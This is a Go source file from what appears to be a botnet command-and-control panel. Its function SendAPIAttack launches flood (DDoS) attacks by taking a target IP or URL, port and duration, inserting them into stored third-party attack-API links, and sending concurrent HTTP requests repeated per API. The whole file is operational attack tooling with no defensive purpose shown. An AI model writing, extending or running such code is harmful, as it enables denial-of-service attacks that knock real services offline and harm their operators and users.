package floods

import (
	"cnc/internal/clients"
	"cnc/internal/database"
	"cnc/pkg/logging"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"sync"
)

func (v *Vector) SendAPIAttack(profile *AttackProfile, vectorName string) error {
	// l7 sanitization
	if v.IsL7 {
		if _, err := url.Parse(profile.L7Target); err != nil {
			return errors.New("not a valid target")
		}
	}

	portFlag, _ := FlagList["dport"]
	port, exists := profile.Options[portFlag]
	if !exists {
		// No port, default to 80
		port = "80"
	}

	// get all apis
	apis, err := database.API.SelectAllByMethod(vectorName)
	if err != nil {
		return err
	}

	var wg sync.WaitGroup

	for _, api := range apis {
		var link = api.ApiLink

		// replace port and duration
		link = strings.ReplaceAll(link, "$port", port)
		link = strings.ReplaceAll(link, "$duration", strconv.Itoa(int(profile.Duration)))

		// replace target based on if l7
		if v.IsL7 {
			link = strings.ReplaceAll(link, "$target", profile.L7Target)
		} else {
			var firstTarget uint32

			for address, _ := range profile.Targets {
				firstTarget = address
				break
			}

			// replace target
			link = strings.ReplaceAll(link, "$target", clients.Int32ToIPv4(int(firstTarget)).String())
		}

		logging.Global.Info().
			Str("api_id", api.ApiName).
			Str("method", api.Method).
			Int("amount", api.Times).
			Msg("Requesting API")

		for range api.Times {
			wg.Add(1)

			go func() {
				defer wg.Done()

				resp, err := http.Get(link)
				if err != nil {
					logging.Global.Warn().
						Err(err).
						Str("api_id", api.ApiName).
						Str("method", api.Method).
						Msg("An error occurred while sending to an API")
					return
				}

				if resp.StatusCode != 200 {
					logging.Global.Warn().
						Str("api_id", api.ApiName).
						Str("method", api.Method).
						Str("status_code", resp.Status).
						Msg("An error occurred while sending to an API (status != 200)")

					body, _ := io.ReadAll(resp.Body)
					fmt.Println(string(body))
				}
			}()
		}
	}

	wg.Wait()
	return nil
}
